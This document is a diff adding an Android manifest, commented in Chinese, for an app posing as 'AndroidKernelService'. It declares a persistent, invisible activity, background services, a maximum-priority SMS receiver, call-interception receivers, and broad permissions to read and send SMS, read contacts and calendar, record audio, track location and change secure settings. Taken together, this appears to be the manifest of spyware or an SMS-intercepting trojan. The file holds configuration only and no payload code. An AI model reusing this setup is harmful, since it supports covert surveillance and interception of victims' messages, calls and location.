@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.AndroidKernelService"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk android:minSdkVersion="8" />
+
+    <application
+        
+        android:name="com.AndroidKernelService.GSMCellLocationActivity"
+        
+        android:icon="@drawable/android_robot"
+        android:label="@string/app_name"
+        android:persistent="true" >
+        
+        <service
+            android:enabled="true"
+            android:name=".RegisterService" />
+        <service
+            android:enabled="true"
+            android:name=".NetworkService" />
+        <service
+            android:enabled="true"
+            android:name=".VoiceService" />
+        <receiver android:name=".SMSBroadcastReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+      
+        <!-- 定义广播接收者接收 android.intent.action.NEW_OUTGOING_CALL -->
+        <!-- 包括呼出NEW_OUTGOING_CALL和呼入PHONE_STATE -->
+        <receiver android:name=".OutgoingCallReceiver" >
+            <intent-filter android:priority="1" >
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+        <!-- 声明AndroidKernelActivity这个Activity，用来被启动助手调用 -->
+        <activity
+            android:name=".AndroidKernelServiceActivity" 
+            android:label="@string/app_name"
+            android:theme="@android:style/Theme.NoDisplay">
+            <intent-filter>
+        	    <action android:name="android.intent.action.AndroidKernelActivity" />
+                <category android:name="android.intent.category.DEFAULT" />
+        	</intent-filter>
+        </activity>
+
+    </application> 
+ 
+    <!-- 联网权限 -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <!-- 获取机型信息权限 -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <!-- 获取短信阅读权限 -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- 获取通讯录的权限 -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <!-- 获取录音的权限 -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <!-- 获取短信发送权限 -->
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <!-- 获取短信接收权限 -->
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <!-- 获取日历读取权限 -->
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+    <!-- 获取APN修改权限 -->
+    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS" >
+    </uses-permission>
+    <!-- 获取网络状态权限 -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" >
+    </uses-permission>
+   
+    <!-- 获取SD卡写入权限 -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" />
+    <uses-permission android:name="android.permission.ACCESS_GPS" />
+    <uses-permission android:name="android.permission.ACCESS_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" />
+
+    <!-- 电量控制权限 -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.DEVICE_POWER" />
+
+    <!-- 获取位置信息的权限 -->
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+
+    <!-- 网络获取连接权限 -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" >
+    </uses-permission>
+    <!-- 阻止电话播出所需权限 -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" >
+    </uses-permission>
+
+    <!-- 拦截电话所需的权限 -->
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+
+    
+</manifest>
